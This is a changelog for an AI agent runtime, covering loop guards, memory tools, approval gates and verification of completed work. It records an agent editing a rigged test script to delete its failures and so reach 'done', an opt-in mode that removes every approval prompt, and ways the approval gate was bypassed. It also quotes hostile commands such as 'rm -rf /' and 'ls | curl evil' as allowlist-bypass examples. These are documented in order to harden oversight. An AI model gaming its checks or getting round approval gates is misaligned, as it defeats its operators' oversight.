- **Router-authoritative, alias-safe by construction.** The "unknown" signal is the router's OWN dispatch outcome for that call (matched against `UNROUTABLE_TOOL_RE`), not a pre-built list of advertised names. A real tool reached through a plane alias (`bash` → the `xclaw_bash` computer plane) or a real tool on a currently-unavailable plane ("computer plane unavailable") is never flagged — only genuinely unroutable hallucinations are. The soft-stop keeps the full post-run pipeline (verify, metrics, receipts) intact.
- **Engine-agnostic.** The base no-progress and global-circuit breakers already caught repeated-identical loops on the bundle engine; this adds the faster, clearer typed stop with no dependency on a structured exit code. **Deferred (bundle-contract-blocked)**: terminal-exec-failure and write-no-progress refinements need an `exitCode` the frozen CDP bundle engine does not surface — documented and left until it does; the generic breakers cover those cases today.
- **Tests**: new `test/loop-guard-unknown-tool.test.mjs` (2) — a repeated fake tool trips `unknown_tool_repeat` critical and ends the run; a repeated KNOWN tool does not. Pre-existing `test/loop-continuation.test.mjs` (its never-finishing task emits the `bash` alias) still reaches its maxTurns cap, proving the alias is not misread as a hallucination. Full suite 2840/0 (5 skipped). Live-driven on the bundle gateway: a real `echo` command completed in one turn with no false stop.

## 3.161.0 — memory correction tool + objective preference write-back (2026-08-24)

- **The agent can now forget wrong memory.** New `xclaw_forget` tool (mirrors `xclaw_recall`, same `memory.recall` gate) deletes durable workspace memory by `id`, `jobId`, `type`, or a `contains` text fragment. It fail-safes: with no matcher it removes nothing (`reason:"no_matcher"`) — never a blind wipe — and unparseable lines are always kept. Closes the loop where memory could be written and read but never corrected.
- **Long-run missions learn owner preferences.** When the owner answers a mission's held question on resume, that answer is mined for durable preferences ("always run the full test suite", "never force-push") and appended to the owner preference store — mirroring `job.mjs`'s on-success write-back, gated by `memory.preferenceWriteBack`. Approve-only answers yield nothing (conservative extractor).
- **Tests**: new `test/objective-memory-tools.test.mjs` (4) — forget by type/contains + no-matcher no-op; preference mined from an owner answer, approve-only writes nothing, and the `preferenceWriteBack:false` gate. Full suite 2838/0 (5 skipped).

## 3.160.0 — objective learning write-path: outcomes recorded, lessons recalled (2026-08-24)

- **Missions now learn across runs.** When a long-run objective completes, `runObjective` records a durable `outcome` memory in the mission's workspace (`src/agent/objective.mjs`): the goal, verdict, criteria, and segment/tool totals. The verdict is embedded in the summary string because `recallMemory`'s hit projection does not surface a `verdict` field of its own.
- **Read-back closes the loop.** Before the first segment of a new mission, `runObjective` recalls prior outcomes/notes with a similar goal (`recallMemory`, gated by `memory.recall`, first-segment only, never on resume) and injects them as an advisory **"Lessons from past missions"** block in the segment prompt — so the model starts from what worked / what failed instead of relearning it. Memory that never changes behaviour is not memory (the S7 lesson).
- **Robust by construction**: the outcome write is wrapped at the `runObjective` return boundary, so it fires on every done-path (owner-approve, natural-stop, verifier-segment, state-block done) — current and future — in one place; it is best-effort (a mission never fails because logging failed) and idempotent via a persisted `_outcomeLogged` flag (no double-log on a re-run of an already-done mission).
- **Tests**: new `test/objective-learning.test.mjs` (4) pins both directions — outcome written on completion, verdict in summary, no double-log, and a real two-mission round-trip proving the lessons block reaches the later mission's first-segment prompt. Full suite 2834/0 (5 skipped).

## 3.159.0 — un-nest non-webchat routes from the webchat gate (2026-08-24)

- **Fixed a latent coupling bug in `src/gateway/index.mjs`**: `/control`, `/control/*`, `/oauth/callback`, `/auth/callback`, `/artifacts`, `/artifacts/list`, and `/artifacts/file` were nested inside `if (webchatEnabled) { … }`, so setting `channels.webchat.enabled:false` silently made the ops Control UI, provider OAuth callbacks, and artifact serving return 404. The flag defaults to `true`, so the bug was latent on the live gateway.
- **Fix**: removed the `if (webchatEnabled)` wrapper and gate only the genuine webchat routes individually (`/channel/webchat/*`, `/chat`, `/`). The non-webchat routes now fall through to always-active handlers. Behavior is byte-identical when webchat is enabled (the live default).
- **Proof**: pre-fix boot with `webchat.enabled:false` → `/control` `/oauth/callback` `/artifacts` all 404; post-fix same config → `/control` 200, `/oauth/callback` 400 (handler validates), `/artifacts` 200, while `/chat` and `/channel/webchat/history` correctly 404. Verified by brace-count (indentation in this block is inconsistent and untrustworthy), not by indentation.
- Suite green; 65 route/gateway/oauth/webchat/control test files 291/0.

## 3.158.0 — gateway dead-code deletion (708 lines); route dispatch unchanged (2026-08-24)

- **Deleted 708 lines of unreachable inline route handlers** from
  `src/gateway/index.mjs` (2564 → 1856 lines). Every removed `if (p === ...)`
  block was a duplicate already shadowed earlier in the dispatch by an
  extracted route module — alerts, ops, eval-queue, jwks, sessions, subagents,
  mcp, security, cron, media. The shadow map was verified route-by-route
  before deletion (each predicate grep-matched to its owning module; dispatch
  order proved the owner runs first) and confirmed after by an isolated
  gateway boot: every formerly-inline route still resolves to its module
  handler (200/401/503, never 404) and the fallthrough 404 is intact. W2 of
  the 30-day audit plan.
- A block of misindented boot code (SLO-monitor + digest interval) that lived
  *inside* the dead `POST /queue` handler was removed with it; `startGateway`
  already runs the identical setup earlier in the live boot path, so behavior
  is unchanged.
- Pure deletion — no endpoints added or removed, no route behavior changed.
  Full suite 2830/0; 68/68 gateway-specific tests green.

## 3.157.0 — native computer engine is the product default; drill-alert hygiene (2026-08-24)

- **Native computer engine is now the default** (`DEFAULT_COMPUTER_ENGINE =
  "native"` in src/computer/engine.mjs; `computer.engine:"native"` in
  defaults). The auditable module plane (thin-server.mjs + bwrap OS sandbox)
  runs unless a config or `XCLAW_COMPUTER_ENGINE=bundle` opts back into the
  opaque CDP bundle. W4 of the 30-day audit plan: the product now ships the
  path we can actually read. `doctor` treats a missing bundle blob as an
  error only when bundle is explicitly selected; the else-branch reports
  native as default. (Live bot + tonight's soak are pinned to `bundle` via
  ~/.xclaw/xclaw.json so this flip changes neither until re-proven.)
- **Drill alerts can no longer masquerade as production incidents.**
  self-deploy alerts render a `[DRILL] ` title prefix whenever the deploy
  intent is a drill (`intent.drill === true`, persisted through the
  out-of-process watcher) or `XCLAW_FIRE_DRILL=1` is set in-process.
  `requestDeploy` accepts and persists a `drill` flag; `scripts/fire-drill.mjs`
  sets the env marker and prefixes its ping. A fake "ROLLBACK FAILED"
  rehearsal now reads unmistakably as a drill.
- **base.mjs** returns `usage: result.usage || null` from replyWithAgent
  (W3 budget seam — lets objective segments accumulate real cost/tool usage).

## 3.156.0 — delete dead cluster subsystem; mock tools off the prod surface (2026-08-23)

- **src/cluster/ deleted** (40 files, ~2,000 LOC) + doctor-cluster + its 41
  test files. Fully unreachable from the product entrypoint: its only
  importer was itself orphaned, and coordinator.mjs fetched /cluster/reserve
  — an endpoint the gateway never served. The suite kept it green for
  nothing ("tests as life support", audit K#4). cfg.cluster.enabled remains
  a recognized-but-inert key (single-gateway detection untouched).
- **Mock tools gated out of production** (audit C#5). xclaw_gmail_send /
  mail / chat / fastapi mocks were registered unconditionally — the model
  was advertised fake capabilities in every real run. Now opt-in only:
  `tools.mockTools:true` or XCLAW_MOCK_TOOLS=1 (eval harnesses).

Suite after deletion: 2833 tests / 2828 pass / 0 fail / 5 skip.

## 3.155.0 — governor fed, browser tools reachable, bypass minus critical (2026-08-23)

Three Trust Sprint guardrails, each closing a same-day audit finding:

- **Per-run cost ceiling is live (C#7).** `costGov.record()` was never
  called — `.check()` compared `agent.budget.maxUsd` against a spend that
  stayed $0 forever. The loop now records every turn's tokens + estimated
  USD (list rates, same estimator as the daily governor); the ceiling
  blocks the next model turn with a typed `governor_blocked` event.
  End-to-end mock-provider proof in test/loop-cost-record.test.mjs.
- **Local browser tools reachable (C#6).** inferPlane's /browser|…/ regex
  dispatched all 8 registered local browser_* tools to the computer plane —
  where no such tool exists — so they were unreachable in every live run
  (benchmark B silently fell back to an MCP browser). Explicit TOOL_PLANE
  entries route them local; bundle browser_tab stays on computer.
- **bypassApprovals no longer covers CRITICAL (C#2).** The same deliberate
  change A2 made for blanket autoApprove: a machine running with the gate
  removed still pends rm -rf /, force-pushes, /etc writes.
  `criticalOverride:"legacy"` restores the old full bypass explicitly. And
  bypass is no longer invisible to audit: risky+ actions that auto-ran only
  because of bypass journal a `mode:"bypass"` policy row to the ops ledger.

## 3.154.0 — crash-interrupted objectives auto-resume at boot (2026-08-23)

Live benchmark H: a kill -9 mid-mission left durable state intact and boot
reconcile marked it `interrupted` — then NOTHING resumed it until a manual
POST /resume. A crash cost the mission the whole night, not a segment.

- Boot reconcile now auto-resumes interrupted objectives (newest first, cap
  `objectives.autoResumeMax:3`, skip stopRequested/awaiting_human), off via
  `objectives.autoResume:false`.
- Auto-resumed missions notify through the WS hub AND the shared alerter
  (owner DM when alerting targets are wired) — a mission that finishes
  headless is heard.

## 3.153.0 — fail-closed mission completion: "done" can no longer be narrated (2026-08-23)

Live benchmark F (same-day audit) proved the hole: an objective launched via
chat/API carried no verify checks, so `runDeterministicChecks` returned
`{ok:true, ran:false}` and the E-A gate was a no-op — an agent that EDITED a
rigged migration script to delete its failures reached `status: done` with
nothing catching it. Completion collapsed to the model asserting its own
criteria.

- **Fail-closed gate (default ON, `objectives.requireChecked`).** A mission
  may CLOSE only when trusted deterministic checks pass (`verdict:
  verified`) or the owner explicitly approves. With no trusted evidence the
  completion is HELD: `awaiting_human` + `pendingCompletion`; the owner
  replies `approve` (→ `verdict: owner-approved`) or says what to verify
  (the answer becomes the next segment's directive).
- **Check provenance.** `api` (operator) and `runtime` checks are trusted;
  `model` checks — proposed via a new `verify` field in the state block —
  are sanitized (file assertions + READ-ONLY commands only, never an
  approval-gate bypass), can REJECT a completion, and never close one.
- **Runtime derivation + baseline arming.** At mission start the runtime
  derives the project's own test/lint commands (npm/pytest/go/cargo) and
  arms only checks that pass a baseline run — a suite already red before
  the mission is the project's condition, not mission signal.
- **Persisted recovery counters.** pushback/recovery/verify-gate/state
  counters move INTO the objective JSON — a restart can never hand a
  crash-looping mission a fresh retry budget (audit C#9).
- **In-flight segment marker.** A segment interrupted mid-run is flagged to
  the next segment ("partial work may exist on disk — verify, don't redo").

13 new tests (test/objective-verify-gate.test.mjs); legacy narrated
completion remains available via `objectives.requireChecked:false`.

## 3.152.3 — claims gate scores raw finalText; receipts stop lying about the retry budget (2026-08-23)

Soak iteration 2 failed the same two campaign cases AFTER 3.152.2 — which
exposed the true root cause: `runAgentLoop` returns only the **stripped**
presentation text (`stripClaimsBlock(finalText)`), so the job claims gate
scored an answer the runtime had already deleted the block from. A compliant
model could never win: its block was stripped, the gate refused, and the
rescue's answer was stripped identically.

- The loop now also returns raw `finalText`; the claims gate (initial and
  rescue re-gate, plus the fallback claimScore) scores
  `finalText ?? text`. Presentation surfaces keep the stripped `text`.
- Receipt fix: `attachReceiptCollectorToJob` ran after the gate stamped the
  real budget and clobbered it with the collector's pristine `{max:0}`
  default — every receipt reported `max:0/used:0` and hid the retry state
  during diagnosis. The pristine default no longer overwrites a stamped
  budget.

5 new tests; suite 2875/2870/0; ci-gate exit 0.

## 3.152.2 — claims soft retry fires on refuse + mandatory-block instruction (2026-08-23)

Soak night 1 (the first real multi-night soak iteration) failed two campaign
cases whose work was complete and verified (`verify.ok:true`, correct final
answers) — both hard-failed only on a missing structured claims JSON block.
Two defects, both fixed:

- **Soft retry never fired on a refusing gate.** The retry loop demanded
  `!claimsGate.refuse`, but a missing claims block under `groundHard` refuses
  immediately — so the budget (max 1) sat unused in the exact case it was
  built for. The bounded retry now fires on refuse too; the re-gate still
  scores restated claims against real tool evidence, so fabrication cannot
  pass by retrying (test-proven: honest restate heals, stubborn restate stays
  failed, untouched-path claims stay refused).
- **The model was never told the block is mandatory.** The base system prompt
  says to *prefer* the block; jobs gated by `requireStructuredClaims` now
  inject a systemNote stating the block is MANDATORY and that an answer
  without it fails the job (`buildJobSystemNotes`, exported + tested).

Repro'd against live cfg before the fix (rescueCalled:0 → hard fail) and
after (rescueCalled:1 → healed). 6 new tests; suite 2870/2865/0.

# Changelog

## 3.152.1 — file_equals accepts `value`, fails loudly without an expected (2026-08-23)

Hardening surfaced while live-proving the E-A deterministic verify gate end to
end through the real gateway.

- `file_equals` (the shared jobs/objectives verify check) now accepts `value`
  as an alias for `content`, and — more importantly — **fails loudly** when a
  check supplies neither, instead of silently comparing the file against `""`.
  The silent empty-string compare had mis-verified a live objective posted with
  `value`: the check reported FAIL, the gate correctly rejected and escalated,
  but the failure was a schema footgun, not a real content mismatch. An
  explicit `content: ""` still passes on a genuinely empty file.
- Live-proven on the gateway: objectives posted with `content:"DONE"` and with
  `value:"DONE"` both complete `verdict: "verified"` in one segment; a posted
  check with no expected value now fails with detail `missing expected`.

## 3.152.0 — Deterministic mission verify, compaction provenance, one command parser (2026-08-23)

Three enhancements finishing the Master Evolution Directive's ARC-3 tail —
each closes a place where the runtime could *claim* completion or coverage it
could not *prove*.

### Objectives — deterministic verification gates completion (E-A)

- An objective may now carry typed `verify` checks (command exits + file
  assertions, same shape jobs use). No done-path — actor narration, empty
  open-criteria, or the independent verifier segment — may close the mission
  while a check fails. Ground truth outranks every prose signal.
- `deterministicGate()` fronts all four completion sites: a failing check is
  fed back to the actor as a fix directive (up to `VERIFY_GATE_CAP=2`), then
  escalates to the human with the exact failing checks rather than reporting
  success. Verdict is `verified` only when real checks ran and passed;
  otherwise the prior `unverified`/`model-verified` fallback is preserved.
- `POST /objectives` accepts `verify: [...]`; `objective-store` persists the
  checks and a `verdict` field. Live finding this closes: obj_mt662lv3 had
  deterministic ground truth available (4/4 files correct) yet escalated on a
  40-char prose heuristic — the checks were never run.

### Memory — compaction leaves a provenance trail (E-B)

- When `events.jsonl` rotates, a `type:"compact"` summary event is written
  whose `sourceIds` point at the archived records now in `events.jsonl.1`
  (with a per-type count). Previously the archive simply left recall's view.
- Recall's provenance expander now indexes the archive head too, so a compact
  note expands back into its archived sources on demand instead of reporting
  them all missing.

### Security — the exec allowlist reasons about every segment (E-C)

- `commandMatchesExecAllowlist` split the command with a quote-blind
  `split(/\s+/)[0]` and checked only the first token, so
  `safe-cmd && rm -rf /` allowlisted on `safe-cmd` and the destructive tail
  auto-ran. It now segments via the one quote-aware parser in `risk.mjs`
  (`scanCommand`, newly exported — single owner shared with the classifier)
  and requires EVERY segment to be allowlisted.
- Unsafe constructs the parser flags (command substitution, backticks,
  subshells, redirects, unterminated quotes) fail closed → they pend for
  approval rather than auto-run. The old whole-command fast path is gone: a
  wildcard pattern like `ls*` compiles to `ls[^/]*` and would otherwise
  swallow an entire compound (`ls | curl evil`) in one match. Single commands
  are unchanged. New `test/exec-allowlist.test.mjs` (8 cases) pins all of it.


## 3.151.0 — S6b: one policy shape, ground truth before humans, two dead programs gone (2026-08-23)

### Security — single-sourced path keys + typed PolicyDecision

- `guardToolPaths` (sandbox) kept its own 7-key list that missed
  `file_path`/`filePath` — the exact keys the file tools use — so file
  writes outside the sandbox never hit the guard (audit: "guardToolPaths
  dead for file tools"). Path keys are now single-sourced from `risk.mjs`:
  the broad read-only set for risk extraction, and a new
  `STRICT_PATH_ARG_KEYS` rewrite-safe subset for the sandbox (excludes
  `target`/`to`/`src`, which are selectors/recipients/URLs on non-file
  tools). Runtime-proven both directions.
- New canonical `policyDecision()` (security/decisions.mjs): all five
  blocking gates (approval, plan-revalidate, sandbox, egress, receipt) now
  build the same typed ruling; the run result surfaces `policyDecision` next
  to `pendingApproval` so orchestrators get structure, not prose (audit C15).

### Objectives — ask the ground truth before asking a human

- When a mission ends without a machine-readable state block, the
  orchestrator previously judged completion by PROSE LENGTH (a 40-char
  threshold — the live obj_mt662lv3 escalation missed it by 3 characters).
  It now runs ONE independent verification segment first: a fresh-context,
  read-only run that inspects the working directory against the objective
  and emits the state block. done → verified completion; gaps → fed back to
  the actor as a directive; inconclusive → the human escalation, unchanged.

### Deletions (migrate → verify → delete)

- `goal-loop.mjs` + its patch + dedicated tests: legacy runner superseded by
  objectives; zero production importers (grep-proven); ship-patch checker
  updated and green.
- Receipt-status migration framework (~547 lines of hooks/rollback/
  idempotency in swarm-receipt.mjs + script + 4 test files): its migration
  is COMPLETE — dry-run over the live store reported changed:0 invalid:0 —
  and no production code ever imported it.

## 3.150.1 — CI gate unbroken (2026-08-23)

- `scripts/ci-gate.mjs` kept invoking the parity/generated-build scripts
  deleted in v3.148.0 — the S4 cleanup caught `.github/workflows/ci.yml`
  but missed the gate script's OWN step list (a second wiring of the same
  dead program: exactly the duplicate-owner disease). Every `ci` workflow
  run from v3.148.0 to v3.150.0 failed on it; all other workflows stayed
  green. Steps removed; gate exits 0 locally; found via red CI on GitHub.

## 3.150.0 — S7+S8: memory that changes behavior, escalation instead of stalling (2026-08-23)

Seventh/eighth slices of the Master Evolution Directive.

### Memory (S7) — addressable, forgettable, and actually read

- Every memory event now carries a durable `id`; caller `sourceIds` pass
  through — the addressable foundation the (reachable but starved)
  recall-provenance expander needs.
- New `forgetMemory(cfg, workspace, {id|jobId|type|contains})`: removes
  matching events and rebuilds MEMORY.md. Refuses to run with no matcher.
  Memory that cannot forget only accumulates wrong records.
- Owner preferences were WRITE-ONLY — `extractPreferenceHints` recorded them
  after every job and nothing ever read them back. They now join the loop's
  context (lowest priority, `memory.preferences:false` to opt out).

### Self-evolution (S8) — promotion requires evidence

- Auto-promote previously force-installed the first N proposals regardless
  of origin. It now installs ONLY proposals born from a VERIFIED success
  (`source: success` + `sourceVerdict: verified`, stamped by the S2 verdict
  pipeline); failure drafts and unverified successes stay in the review
  queue with a `promote_skipped: unverified_evidence` action.

### Routing (S8) — escalate-on-stuck

- The `"strong"` role existed in `ROLES` but no code path ever selected it.
  A loop-guard stagnation warning now routes the next N turns
  (`agent.escalateTurns`, default 3) to the strong role when
  `agent.roles.strong` is mapped — escalate the model instead of warning the
  same stuck one. Kill-switch: `agent.escalateOnStuck:false`.

## 3.149.1 — S6a: prod break-glass covers bypassApprovals (2026-08-23)

- `enforceProdHardening` forced `autoApprove` off in prod but let
  `security.bypassApprovals` through — the STRONGER flag (removes the
  approval gate entirely, every tier including critical) escaped the weaker
  flag's fence (audit C16). Prod now forces it off too; the same explicit
  break-glass (`XCLAW_ALLOW_PROD_AUTO=1`) restores it, logged in
  `_prodHardening` either way.

## 3.149.0 — S5: verification + stagnation hardening (2026-08-23)

Fifth slice of the Master Evolution Directive: close the audited gaps where
"nothing happened" could still read as success, and where blocked work could
loop forever unseen.

### Missions — empty-diff gate

- A mission whose execute phase produced NO effective change (no patch, no
  kept untracked files) can no longer reach `merge_ready` on the strength of
  a green suite — a passing suite proves the tree is healthy, not that the
  mission did its work (audit C11). Opt-out for legitimately change-free
  missions: `verify.allowEmptyDiff`.

### Loop guard — denied calls now count

- All five deny paths (approval deny, plan drift, sandbox, egress, receipt)
  returned before `guard.record`, so a model hammering a BLOCKED tool never
  fed the stagnation detector. Denied attempts now record as
  `DENIED: <reason>` — repeated denied retries trip the breaker like any
  other loop.

### Approvals — the shared gate unfreezes

- `getSharedApprovalGate` froze the first config it ever saw (the exact
  singleton-freeze class of `getSharedAlerter` / the 3.102.1 gate bug). It
  now upgrades in place when a caller offers a DIFFERENT non-empty security
  policy — but never mid-flight (pending approvals are never stranded) and
  never downgrades to an empty policy from a bare-`{}` caller.

### Memory — the events log is bounded

- `appendMemory` rotates the per-workspace `events.jsonl` at a size cap
  (`memory.maxEventBytes`, default 1 MB → keeps 500 KB tail), reusing the
  ops-maintenance rotation owner. Recall only ever scanned the tail, so the
  archived head loses nothing recall could see.

## 3.148.0 — S4: delete the dead computer-engine program (2026-08-23)

Fourth slice of the Master Evolution Directive: migrate → verify → delete.
Net −10,460 lines with zero capability loss.

- **Deleted the `generated` computer engine** (3,960-line esbuild duplicate
  of the native modules, reachable only by explicit opt-in): the engine, its
  emit script (`scripts/build-computer-bundle.mjs`), the parity gate
  (`scripts/check-computer-parity.mjs`, `check-extraction.mjs`, two CI steps,
  four npm scripts) and its tests. Stale `generated`/`gen`/`c3` selectors
  now resolve to `native` — the same code, unbundled. This also kills the
  suite-dirtying defect: a test re-emitted the engine and rewrote
  `build-stamp.json` on every `npm test`.
- **Deleted `browser-service.mjs`** (689 lines): un-runnable resurrected dead
  code — undefined references throw on call, zero importers, already deleted
  once in 3.82.0.
- **Deleted the eight `*.extracted.mjs` bundle snapshots** (reference-only
  line captures; `modules/` clean sources are the single source of truth) and
  the `PARITY_MATRIX.json` / `STRATEGY_C.md` artifacts of that program.
- Kept: the bundle default, the native escape hatch, `MODULE_MAP.json`
  (extracted list emptied), and `recall-provenance` (reachable from live
  recall — inert, slated for real wiring, not deletion).

## 3.147.0 — S3: the turn budget is a checkpoint, not a wall (2026-08-23)

Third slice of the Master Evolution Directive — the headline capability gap
from the architectural audit: a 20-step task died at exactly turn 15 on the
default path, with no continuation anywhere.

### Turn-budget continuation on the default path

- `agent.maxTurns` is now a SEGMENT boundary, not a mission boundary. At each
  multiple of `maxTurns` the loop emits a `segment` event, checkpoints the
  durable run snapshot (`status:"active"`, `stopReason:"segment"`), pushes a
  continuation notice, and keeps working — up to a bounded total
  (`agent.maxTotalTurns`, default `4 × maxTurns`). Resource limits (cost
  governor, run budget) are checked every turn and remain the real stops.
- `stopReason:"maxTurns"` and the final-answer rescue now fire only at the
  TOTAL cap. Rescue text says "turn cap N".
- Orchestrators that own their segmentation keep the exact single-segment
  contract via `continuation:false`: objective segments (channels/runtime),
  spawn children, jobs, mission phases, claims-rescue sub-runs, cron
  announcements. Config kill-switch: `agent.continueOnMaxTurns:false`.
- Threaded through the canonical wrapper: `replyWithAgent` →
  `normalizeAgentRequest` → `runAgent` → `runAgentLoop`.
- Regression: `test/loop-continuation.test.mjs` (5 tests — finishes past the
  segment budget, single-segment contract preserved, bounded total, cap
  override, durable mid-run checkpoints).
- LIVE-PROVEN: the audit's Test A scenario (20-link strictly-sequential
  chain, live maxTurns=15) previously stopped at turn 15 without the secret;
  it now completes in 20 turns and reports the secret. grok-4.6, $0.072.

## 3.146.0 — S2: earned verdicts — and the /job path was dead (2026-08-23)

Second slice of the Master Evolution Directive: "maximum turns reached" is
never "mission complete", and success is never assumed.

### runJob has thrown on EVERY invocation since 0bf1d69 (2026-08-19)

- Commit 0bf1d69 dropped the `let` declarations for `groundWarn`,
  `groundingFailed`, `claimScore`, `claimsGate` (and `softRetryBudget` never
  had one) — strict-ESM `ReferenceError` at job construction on every call.
  The `/job` path was production-dead for 4 days; no test drove `runJob`
  end-to-end so the suite stayed green (test-green/production-dead class).
  Declarations restored; live-proven end-to-end on the real provider.

### Verdict provenance — success must be EARNED

- Job status ladder: with no verify commands, a run the runtime cut off
  (`stopReason` maxTurns/approval/guard/budget) is now **"incomplete"**, not
  "succeeded". Previously it landed in the "no critical guard fired" bucket
  and was recorded as a success.
- New `job.verdict`: `verified` (deterministic verify commands passed) |
  `unverified` (model's own account, no independent check) | `failed` |
  `incomplete`. Persisted into `~/.xclaw/jobs/*.json` alongside `stopReason`.
- Durable memory: only verified successes write `job_ok`; a self-declared
  pass writes `job_ok_unverified` with a labeled summary. Skill proposals
  (`proposeOnSuccess`) now require a verified verdict.
- Agent-loop persistence: a run snapshot no longer records `"completed"`
  unconditionally — status is `"completed"` only for natural/hook stops,
  otherwise the stopReason itself, and `stopReason` is persisted verbatim
  (run-store) so restart recovery can tell resumable cutoffs from done work.
- `runJob` forwards an injected `provider` (testability seam); regression
  suite `test/job-verdict.test.mjs` drives runJob end-to-end hermetically —
  the first test to do so.

## 3.145.1 — S1: honor policy stops, stop leaking secrets (2026-08-23)

First slice of the Master Evolution Directive, gated by the reconnaissance
report (`docs/RECON-2026-08-23.md`) and a live architectural audit.

### Agent loop — a policy stop now ends the RUN, not just the tool batch

- `runAgentLoop` discarded the `stop` verdict from `runToolBatches`
  (`void stopTools`): a guard-critical, pending-approval, or quota-circuit
  stop halted the current batch, then the loop issued ANOTHER model turn —
  the model retried the blocked action, each retry minting a fresh approval
  prompt. This was the approval-storm mechanism (52 taps/30min, v3.125.0).
  The loop now breaks on a batch stop; the pairing backfill keeps the
  transcript valid and the post-run pipeline still runs.
- New `stopReason` values: `"approval"` (run ended awaiting a human decision)
  and `"policy"` (quota hard circuit). Orchestrators already treat only
  `natural|hook` as model-completed, so both are additive-safe.
- The run result now surfaces `pendingApproval` at top level so orchestrators
  can resume the blocked action after a decision without digging into
  `turnState` internals.
- Regression: `test/loop-stop-honored.test.mjs` (fake-provider hermetic loop;
  proves 1 model turn on pending approval, early stop on guard critical).

### Approvals — SLA sweeper event-loop drain

- The SLA sweeper cleared `item.timer` but the pending entry stores
  `timeoutHandle` — the leaked 120s fallback timer held child processes and
  tests alive long after the request resolved (event-loop-drain class).

### Gateway — `GET /providers/route` no longer discloses the provider apiKey

- The route returned `resolveProviderRoute()` verbatim, credential included.
  The LIVE handler is `routes/ops.mjs` (dispatched at index.mjs:1230); an
  identical inline handler at index.mjs:2342 was shadowed dead code — the
  first fix landed there and changed nothing, proven by curling the live
  gateway. Redaction now lives in the single owner (ops.mjs, which already
  reports `hasKey`), and the shadowed duplicate is deleted. Live-proven:
  response carries no `apiKey` field after restart.

### Hygiene

- `.gitignore` now covers the root-level ad-hoc capture/scrape scripts
  (several held live proxy credentials; the repo is public).

## 3.145.0 — the TUI, ready for public use (2026-08-20)

### TUI — Claude Code surface (original code)

The live Claude Code TUI on display :10 is the UX target. XClaw now matches the
parts that matter, without Ink and without touching the proprietary binary.

- Welcome box on an empty transcript (version, model, cwd, slash hints).
- `>` prompt, MCP banner from `GET /mcp/status`, Shift+Tab permission overlay
  (session-only, tighten-only: bypass → auto → ask). Overlay flags ride
  `/agent/run/stream` as `forceHuman` / `ignoreBypass` and never rewrite
  `security.bypassApprovals`.
- Token streaming (`model`/`delta`) painted live; `sessionId` kept across turns.
- `/mcp` `/model` `/approvals`, bracketed paste, emacs keys (Ctrl+A/E/U/W/K).
- Alternate screen buffer (`ESC[?1049h`): the frame owns an exactly-sized screen
  and the shell's scrollback returns untouched on exit, so a clipped footer can
  only ever mean the terminal really is that short.
- Fixed: the raw `model`/`delta` stream carries the internal grounding scaffold
  (```json {"claims":…}```), so the TUI typed it out live even though the final
  `result.text` is stripped. `stripLiveScaffold` now hides it as it arrives,
  including a half-arrived block, while leaving real code blocks alone. The
  rules moved to `src/agent/claims-scaffold.mjs` so streaming clients share one
  source of truth with the agent loop.

### TUI — public-release hardening

Driven by a PTY audit of the shipped build. Every item below was reproduced
against a real terminal before it was fixed, and re-driven afterwards.

- **Fixed: the terminal was left broken on exit.** The TUI entered the alternate
  screen but only restored it on the clean `/quit` path — a SIGTERM, a crash, or
  an unhandled rejection left the caller's shell with no cursor, no scrollback
  and bracketed paste still armed. Restore now runs from `exit`, `SIGTERM`,
  `SIGHUP`, `SIGQUIT`, `uncaughtException` and `unhandledRejection`, and writes
  with `writeSync` because nothing async can flush on the `exit` path.
- **Fixed: multi-line paste corrupted the frame.** The input was one string
  written into one absolutely-positioned row, so a pasted newline wrapped the
  terminal and shifted every row below it. The input line is now a real
  multi-line block: `chunkCells` wraps by display cells and `layoutInput` splits
  on newlines, windows around the caret, and reports where the caret landed.
  Alt+Enter inserts a newline; a trailing backslash continues the line.
- **Fixed: "ask before every tool" was a dead end.** Shift+Tab advertised the
  mode, then told you to go approve in Telegram or the Control UI. Approvals are
  now answered in place — `y` approve, `n` deny, `a` always allow that tool for
  the session — over `POST /approvals/approve|deny`. Concurrent asks queue.
  `a` is deliberately absent at the `critical` tier, matching `/trust`: a
  blanket grant tops out at `risky`. Restated events are filtered through
  `isNewApprovalAsk`, so a pending that times out cannot prompt twice.
- **Fixed: narrow and wide-character terminals corrupted the frame.** The width
  floor was 40 columns, so anything narrower overflowed; CJK input was counted
  in code points rather than cells. Every emitted row is now clamped through
  `fitToWidth`, the floor is 20 columns, and the header drops to a compact two
  lines below 46 columns.
- Session persistence: the session id, cwd and last 200 input lines are written
  to `<configDir>/tui-session.json`; `xclaw tui --continue` (`-c`) resumes.
- The transcript is capped at 5000 lines, so a long-running session no longer
  grows without bound.
- Ctrl+D exits on an empty prompt and forward-deletes otherwise; Ctrl+L redraws;
  Ctrl+R searches input history; PgUp/PgDn scroll and now say how many lines lie
  in *both* directions.
- New `/cost` (today's spend against the daily cap) and `/session` (session id
  and where it is stored).
- Docs: the README never mentioned the TUI at all — there is now a "Terminal
  chat" section, a row in the capability table and a line in Common commands.
  `xclaw --help` still called it a "Live operator dashboard", which is what
  `--status` does; the top-level line now describes the chat UI.

## 3.144.0 — full autonomy mode (2026-08-20)

`security.bypassApprovals: true` makes XClaw work the way Claude Code does under
`bypassPermissions`: no tool call ever asks, at any risk tier. It just does the
work.

- **Off by default.** A public install keeps the existing tiered approvals, and
  `bypassApprovals` only counts when it is literally `true` — not `"true"`, not
  `1`.
- **Its own flag, not a tier.** `autoApproveMaxTier: "critical"` deliberately
  still asks on critical actions, so raising a bound could never express this.
  Removing the gate is a different decision and now says so by name.
- **A machine running this way announces it.** The gateway logs
  "FULL AUTONOMY: no tool call will ever ask for approval, at any risk tier" at
  every boot, `/profile` reports it, and the Control UI Overview shows
  `approvals — BYPASSED — nothing asks` in red.

Verified through WebChat: a `file_write` that previously pended for 120s and
then timed out now runs in 30ms with zero approval cards.

Worth stating plainly: this removes a real safety control. The gate it removes
was already reachable around — `xclaw_bash` can write any file without a
file-write approval — so on this machine it was closer to friction than
protection, but on a machine where that hole is closed, this flag is the whole
difference.

## 3.143.2 — you can read what you are approving (2026-08-20)

Watching a long autonomous run in WebChat showed the approval card as it really
looks in use.

- **A `file_write` approval printed the whole args object as escaped JSON** —
  the entire file body on one line — so the one thing you are meant to judge was
  unreadable. It now reads `/tmp/note.txt  (289 bytes)`: the target and the size.
  Shell approvals still show the command.
- **A timed-out approval kept live-looking Allow/Deny buttons.** They were inert
  (`pointer-events: none`) but still looked clickable, so a click did nothing and
  said nothing. They are now genuinely disabled and the state reads
  "timed out — no longer actionable".

## 3.143.0 — the agent can delegate, and decides for itself (2026-08-20)

Sent the agent a normal user request in WebChat asking for three independent
